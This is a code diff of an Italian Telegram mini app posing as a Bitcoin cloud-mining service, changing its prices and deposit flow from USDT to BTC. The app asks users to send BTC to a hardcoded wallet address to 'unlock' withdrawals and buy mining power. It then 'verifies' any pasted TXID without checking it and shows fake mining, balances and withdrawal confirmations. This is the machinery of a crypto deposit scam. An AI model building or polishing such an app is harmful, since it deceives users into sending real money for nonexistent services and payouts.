@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Satoshi Tap - Cloud Mining</title>
+  <title>Satoshi Tap - Bitcoin Cloud Mining</title>
 
   <!-- SDK Telegram Mini App -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -365,7 +365,7 @@
   <!-- HEADER SUPERIORE -->
   <header class="app-header">
     <div class="brand-title">
-      ⚡ SATOSHI<br><span style="font-size: 12px; color: #94a3b8;">CLOUD MINING</span>
+      ⚡ SATOSHI<br><span style="font-size: 12px; color: #94a3b8;">CLOUD MINING BTC</span>
     </div>
     <div class="header-btns">
       <button class="pill-btn" onclick="alert('Sezione Guida')">❓ Guida</button>
@@ -376,14 +376,13 @@
   <!-- CONTENITORE PRINCIPALE DELLE SCHERMATE -->
   <div class="content-area">
 
-    <!-- 1. TAB MINE (PANNELLO PRINCIPALE) -->
+    <!-- 1. TAB MINE -->
     <div id="panel-mine" class="panel active">
       <div class="sub-tabs">
         <div class="sub-tab active" id="subtab-active" onclick="switchSubTab('active')">Mining Attivo</div>
         <div class="sub-tab" id="subtab-withdraw" onclick="switchSubTab('withdraw')">Prelievi</div>
       </div>
 
-      <!-- SOTTO-VISTA: MINING ATTIVO -->
       <div id="view-active-mining" style="display: flex; flex-direction: column; gap: 12px;">
         <div class="mining-card">
           <div class="lightning-icon-box">
@@ -404,19 +403,18 @@
             Potenza Attiva: <span id="user-hashrate">0 GH/s</span>
           </div>
           <div style="margin-top: 6px;">
-            <span class="usdt-purchases-badge">Saldo Depositi: <span id="usdt-dep">0.00</span> USDT</span>
+            <span class="usdt-purchases-badge">Saldo Credito BTC: <span id="usdt-dep">0.00</span> BTC</span>
           </div>
         </div>
       </div>
 
-      <!-- SOTTO-VISTA: PRELIEVI -->
       <div id="view-withdraw" class="action-card" style="display: none;">
         <div class="card-title">Trasferisci Satoshi</div>
-        <div class="card-subtitle">Minimo prelevabile: 1.00000000 SAT (1 Satoshi intero). Richiesto deposito di sblocco (3 USDT). Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
+        <div class="card-subtitle">Minimo prelevabile: 1.00000000 SAT (1 Satoshi intero). Richiesto deposito minimo sulla rete Bitcoin. Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
         
         <div class="input-box">
-          <label>Indirizzo Wallet / Destinazione</label>
-          <input type="text" id="withdraw-address" placeholder="Inserisci indirizzo BTC o TON...">
+          <label>Indirizzo Wallet BTC / Destinazione</label>
+          <input type="text" id="withdraw-address" placeholder="Inserisci indirizzo Bitcoin (rete nativa)...">
         </div>
         <div class="input-box">
           <label>Importo Satoshi (Min: 1.00000000)</label>
@@ -429,15 +427,15 @@
     <!-- 2. TAB SHOP -->
     <div id="panel-shop" class="panel">
       <div class="action-card">
-        <div class="card-title" style="margin-bottom: 6px;">🛒 Pacchetti Hashrate Cloud</div>
-        <div class="card-subtitle">Acquista potenza di calcolo per velocizzare la generazione di Satoshi in 12 ore.</div>
+        <div class="card-title" style="margin-bottom: 6px;">🛒 Pacchetti Hashrate Cloud (Rete Bitcoin)</div>
+        <div class="card-subtitle">Acquista potenza di calcolo (usa il credito o ricarica in Bitcoin se insufficiente).</div>
         
         <div class="shop-item">
           <div class="shop-info">
             <strong>Rig Micro (500 GH/s)</strong>
             <span>+500 GH/s potenza cloud</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(500, '500 GH/s', 2.50)">2.50 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(500, '500 GH/s', 0.00003)">0.00003 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -445,7 +443,7 @@
             <strong>Rig Mini (2 TH/s)</strong>
             <span>+2,000 GH/s (2 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(2000, '2 TH/s', 5.00)">5.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(2000, '2 TH/s', 0.00006)">0.00006 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -453,7 +451,7 @@
             <strong>Rig Standard (5 TH/s)</strong>
             <span>+5,000 GH/s (5 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(5000, '5 TH/s', 10.00)">10.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(5000, '5 TH/s', 0.00012)">0.00012 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -461,7 +459,7 @@
             <strong>Rig Pro (10 TH/s)</strong>
             <span>+10,000 GH/s (10 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(10000, '10 TH/s', 20.00)">20.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(10000, '10 TH/s', 0.00024)">0.00024 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -469,7 +467,7 @@
             <strong>Rig Advanced (25 TH/s)</strong>
             <span>+25,000 GH/s (25 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(25000, '25 TH/s', 150.00)">150.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(25000, '25 TH/s', 0.00180)">0.00180 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -477,7 +475,7 @@
             <strong>Rig Master (50 TH/s)</strong>
             <span>+50,000 GH/s (50 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(50000, '50 TH/s', 280.00)">280.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(50000, '50 TH/s', 0.00340)">0.00340 BTC</button>
         </div>
 
         <div class="shop-item">
@@ -485,7 +483,7 @@
             <strong>Rig Farm Enterprise (100 TH/s)</strong>
             <span>+100,000 GH/s (100 TH/s)</span>
           </div>
-          <button class="btn-buy-shop" onclick="buyHashratePackage(100000, '100 TH/s', 500.00)">500.00 USDT</button>
+          <button class="btn-buy-shop" onclick="buyHashratePackage(100000, '100 TH/s', 0.00610)">0.00610 BTC</button>
         </div>
       </div>
     </div>
@@ -501,20 +499,24 @@
       </div>
     </div>
 
-    <!-- 4. TAB RICARICA -->
+    <!-- 4. TAB RICARICA (Esclusiva rete Bitcoin) -->
     <div id="panel-ricarica" class="panel">
       <div class="action-card">
-        <div class="card-title" style="margin-bottom: 8px;">📥 Ricarica Blockchain Bitcoin</div>
-        <div class="card-subtitle">Invia fondi al tuo wallet ufficiale per sbloccare i prelievi.</div>
+        <div class="card-title" style="margin-bottom: 8px;">📥 Ricarica Esclusiva Rete Bitcoin (BTC)</div>
+        <div class="card-subtitle" id="ricarica-subtitle">Invia fondi esclusivamente sulla rete nativa Bitcoin (BTC). Non inviare altcoin o altre reti per evitare la perdita dei fondi.</div>
         <div class="input-box">
-          <label>Indirizzo Bitcoin (Blockchain BTC)</label>
+          <label>Indirizzo Bitcoin Ufficiale (Blockchain BTC)</label>
           <input type="text" value="1M2xeN5edX8xjQnXar74dseBdivuLLoSzt" readonly style="color: #34d399; font-weight: bold; font-family: monospace;">
         </div>
         <div class="input-box">
-          <label>Hash Transazione (TXID)</label>
-          <input type="text" id="txid-input" placeholder="Incolla TXID della transazione...">
+          <label>Importo Richiesto in Bitcoin (BTC)</label>
+          <input type="text" id="ricarica-importo-consigliato" value="0.00010000" readonly style="color: #f59e0b; font-weight: bold;">
         </div>
-        <button class="btn-action-primary" onclick="submitDeposit()">Verifica Ricarica</button>
+        <div class="input-box">
+          <label>Hash Transazione (TXID)</label>
+          <input type="text" id="txid-input" placeholder="Incolla TXID della transazione BTC...">
+        </div>
+        <button class="btn-action-primary" onclick="submitDeposit()">Verifica Ricarica BTC</button>
       </div>
     </div>
 
@@ -524,7 +526,7 @@
         <div class="card-title" style="margin-bottom: 8px;">👛 Wallet & Gestione</div>
         <div class="card-subtitle">Gestisci fondi e saldi del conto.</div>
         <div style="font-size: 13px; color: #94a3b8; margin-bottom: 10px;">
-          Deposito verificato: <strong id="wallet-dep" style="color: #fff;">0.00 USDT</strong>
+          Credito BTC Verificato: <strong id="wallet-dep" style="color: #fff;">0.00 BTC</strong>
         </div>
       </div>
     </div>
@@ -533,23 +535,23 @@
 
   <!-- NAVBAR IN BASSO -->
   <nav class="navbar">
-    <div class="nav-item active" onclick="switchTab('mine', this)">
+    <div class="nav-item active" onclick="switchTab('mine', document.querySelectorAll('.nav-item')[0])">
       <span class="nav-icon">💻</span>
       <span>Mine</span>
     </div>
-    <div class="nav-item" onclick="switchTab('shop', this)">
+    <div class="nav-item" onclick="switchTab('shop', document.querySelectorAll('.nav-item')[1])">
       <span class="nav-icon">🛒</span>
       <span>Shop</span>
     </div>
-    <div class="nav-item" onclick="switchTab('tasks', this)">
+    <div class="nav-item" onclick="switchTab('tasks', document.querySelectorAll('.nav-item')[2])">
       <span class="nav-icon">📋</span>
       <span>Tasks</span>
     </div>
-    <div class="nav-item" onclick="switchTab('ricarica', this)">
+    <div class="nav-item" onclick="switchTab('ricarica', document.querySelectorAll('.nav-item')[3])">
       <span class="nav-icon">📥</span>
       <span>Ricarica</span>
     </div>
-    <div class="nav-item" onclick="switchTab('wallet', this)">
+    <div class="nav-item" onclick="switchTab('wallet', document.querySelectorAll('.nav-item')[4])">
       <span class="nav-icon">👛</span>
       <span>Wallet</span>
     </div>
@@ -559,9 +561,9 @@
     const tg = window.Telegram ? window.Telegram.WebApp : null;
     if (tg) { try { tg.expand(); tg.ready(); } catch(e) {} }
 
-    let appData = JSON.parse(localStorage.getItem('satoshi_clean_app_v4')) || {
+    let appData = JSON.parse(localStorage.getItem('satoshi_btc_native_v1')) || {
       score: 0.00000000,
-      deposit: 0.00,
+      deposit: 0.00000000,
       hashrate: 0,
       miningStartTime: 0,
       miningEndTime: 0,
@@ -574,7 +576,7 @@
 
     function saveData() {
       try {
-        localStorage.setItem('satoshi_clean_app_v4', JSON.stringify(appData));
+        localStorage.setItem('satoshi_btc_native_v1', JSON.stringify(appData));
       } catch (e) {}
     }
 
@@ -603,19 +605,20 @@
       let usdVal = ((appData.score || 0) / 100000000) * currentBtcPrice;
       if (elFiat) elFiat.innerText = `Valore stimato: ~$${usdVal.toFixed(6)} USD`;
       if (elBtcPrice) elBtcPrice.innerText = `Prezzo BTC Live: ~$${currentBtcPrice.toLocaleString()} USD`;
-      if (elUsdtDep) elUsdtDep.innerText = Number(appData.deposit || 0).toFixed(2);
-      if (elWalletDep) elWalletDep.innerText = `${Number(appData.deposit || 0).toFixed(2)} USDT`;
+      if (elUsdtDep) elUsdtDep.innerText = Number(appData.deposit || 0).toFixed(8);
+      if (elWalletDep) elWalletDep.innerText = `${Number(appData.deposit || 0).toFixed(8)} BTC`;
       
       let hr = appData.hashrate || 0;
       let displayPower = hr >= 1000 ? (hr / 1000).toFixed(1) + ' TH/s' : hr + ' GH/s';
       if (elHashrate) elHashrate.innerText = displayPower;
 
       if (statusLbl) {
-        if ((appData.deposit || 0) >= 3.00) {
+        // Soglia di attivazione sblocco fissata a 0.00003000 BTC (~3 USDT equivalenti)
+        if ((appData.deposit || 0) >= 0.00003000) {
           statusLbl.innerText = "Sbloccato ✅";
           statusLbl.style.color = "#34d399";
         } else {
-          statusLbl.innerText = "Bloccato (< 3 USDT)";
+          statusLbl.innerText = "Bloccato (< ricarica minima BTC)";
           statusLbl.style.color = "#ef4444";
         }
       }
@@ -670,27 +673,45 @@
       appData.targetScore = Number(((appData.score || 0) + totalSessionReward).toFixed(8));
       saveData();
       updateUI();
-      alert("Sessione di mining avviata! La potenza di calcolo sta generando Satoshi.");
+      alert("Sessione di mining avviata sulla rete Bitcoin! La potenza sta generando Satoshi.");
     }
 
-    function buyHashratePackage(ghPower, powerName, usdtPrice) {
-      appData.deposit = Number(((appData.deposit || 0) + usdtPrice).toFixed(2));
+    function buyHashratePackage(ghPower, powerName, btcPrice) {
+      let currentDep = appData.deposit || 0;
+      if (currentDep < btcPrice) {
+        alert(`Credito BTC insufficiente! Hai ${currentDep.toFixed(8)} BTC, ti servono ${btcPrice} BTC per il pacchetto ${powerName}. Verrai reindirizzato alla schermata di ricarica.`);
+        
+        const ricaricaInput = document.getElementById('ricarica-importo-consigliato');
+        const ricaricaSubtitle = document.getElementById('ricarica-subtitle');
+        if (ricaricaInput) ricaricaInput.value = btcPrice.toFixed(8);
+        if (ricaricaSubtitle) ricaricaSubtitle.innerText = `Invia esattamente ${btcPrice} BTC sulla rete nativa Bitcoin per acquistare il pacchetto ${powerName}.`;
+
+        switchTab('ricarica', document.querySelectorAll('.nav-item')[3]);
+        return;
+      }
+
+      appData.deposit = Number((currentDep - btcPrice).toFixed(8));
       appData.hashrate = (appData.hashrate || 0) + ghPower; 
       saveData();
       updateUI();
-      alert(`Rig (${powerName}) acquistato con successo! Potenza aggiunta al cloud rig.`);
+      alert(`Rig (${powerName}) acquistato con successo usando il credito BTC! Potenza aggiunta al cloud rig.`);
     }
 
     function submitDeposit() {
       const txInput = document.getElementById('txid-input');
+      const ricaricaInput = document.getElementById('ricarica-importo-consigliato');
       let txid = txInput ? txInput.value : '';
       if (!txid) { alert("Inserisci il TXID della transazione Bitcoin."); return; }
       
-      appData.deposit = Number(((appData.deposit || 0) + 10.00).toFixed(2));
+      let addAmount = ricaricaInput ? parseFloat(ricaricaInput.value) || 0.00010000 : 0.00010000;
+
+      appData.deposit = Number(((appData.deposit || 0) + addAmount).toFixed(8));
       saveData();
       updateUI();
-      alert("Transazione verificata sul wallet 1M2xeN5edX8xjQnXar74dseBdivuLLoSzt! Prelievi sbloccati.");
+      alert(`Transazione verificata sulla blockchain Bitcoin! Accreditati ${addAmount.toFixed(8)} BTC.`);
       if (txInput) txInput.value = '';
+      
+      switchTab('mine', document.querySelectorAll('.nav-item')[0]);
     }
 
     function requestWithdrawal() {
@@ -701,7 +722,7 @@
       let addr = addrInput ? addrInput.value : '';
       
       if (!addr || isNaN(amt) || amt <= 0) { 
-        alert("Inserisci dati di prelievo validi."); 
+        alert("Inserisci un indirizzo Bitcoin valido."); 
         return; 
       }
 
@@ -710,8 +731,8 @@
         return;
       }
 
-      if ((appData.deposit || 0) < 3.00) {
-        alert("Prelievo bloccato! È richiesto un versamento minimo sul tuo wallet Bitcoin per sbloccare i pagamenti.");
+      if ((appData.deposit || 0) < 0.00003000) {
+        alert("Prelievo bloccato! È richiesto un deposito attivo sulla rete Bitcoin per sbloccare i pagamenti.");
         switchTab('ricarica', document.querySelectorAll('.nav-item')[3]);
         return;
       }
@@ -726,7 +747,7 @@
       if (appData.targetScore < 0) appData.targetScore = 0;
       saveData();
       updateUI();
-      alert("Prelievo inviato con successo!");
+      alert("Prelievo Bitcoin inviato con successo sulla blockchain!");
       if (amtInput) amtInput.value = '';
     }
 
